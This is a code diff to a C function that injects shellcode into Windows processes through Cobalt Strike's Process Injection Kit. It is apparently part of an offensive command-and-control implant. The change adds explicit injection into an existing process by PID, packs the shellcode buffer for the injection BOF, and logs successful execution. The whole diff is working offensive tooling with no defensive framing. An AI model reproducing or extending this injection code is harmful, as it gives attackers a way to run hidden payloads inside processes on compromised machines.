@@ -17,7 +17,8 @@ BOOL InjectShellcodeViaKit(
 	_In_  PBYTE   buffer, 
 	_In_  SIZE_T  bufferLen, 
 	_In_  PCHAR   InjectKit, 
-	_In_  SIZE_T  kitLen, 
+	_In_  SIZE_T  kitLen,
+	_In_  UINT32  pid, 
 	_Out_ PCHAR*  outData, 
 	_Out_ SIZE_T* outLen
 )
@@ -39,15 +40,23 @@ BOOL InjectShellcodeViaKit(
 		return Status;
 	}
 
-	/* Pack arguments for Inject Kit (ignoreToken / buffer) */
-	BOOL ignoreToken = FALSE;
-    PPackage temp = PackageInit(NULL, FALSE);
-    PackageAddShort(temp, (USHORT)ignoreToken);                         // +2 bytes
-    PackageAddInt32(temp, bufferLen);                           		// +4 bytes little-endian
-    PackageAddBytes(temp, buffer, bufferLen, FALSE);					// +sizeof(shellcode) bytes
-    PPackage arguments = PackageInit(NULL, FALSE);                      // Length-prefix the whole package
-    PackageAddBytes(arguments, temp->buffer, temp->length, TRUE);
-
+	// Pack arguments for Inject Kit 
+	PPackage temp = PackageInit(NULL, FALSE);
+	
+	// Explicit (pid, offset)
+	if (pid) {
+		PackageAddInt32(temp, pid); 
+		PackageAddInt32(temp, 0);										// offset https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_hooks.htm#PROCESS_INJECT_EXPLICIT
+	// Spawn(ignoreToken / buffer)
+	} else 	{
+		BOOL ignoreToken = FALSE;
+		PackageAddShort(temp, (USHORT)ignoreToken);                     // +2 bytes
+	}
+	// common (shellcode buffer, args)
+	PackageAddInt32(temp, bufferLen);                           		// +4 bytes little-endian
+	PackageAddBytes(temp, buffer, bufferLen, FALSE);					// +sizeof(shellcode) bytes
+	PPackage arguments = PackageInit(NULL, FALSE);                      // Length-prefix the whole package
+	PackageAddBytes(arguments, temp->buffer, temp->length, TRUE);
 	PackageDestroy(temp);
 
     /* Inject PIC with Custom Process Injection Kit BOF */
@@ -58,6 +67,7 @@ BOOL InjectShellcodeViaKit(
 		goto END;
 	}
 
+	_dbg("[+] Execution successful"); 
 
 	Wait = WaitForSingleObject(ov.hEvent, 10000); 		// 10s
 	if ( Wait != WAIT_OBJECT_0 )
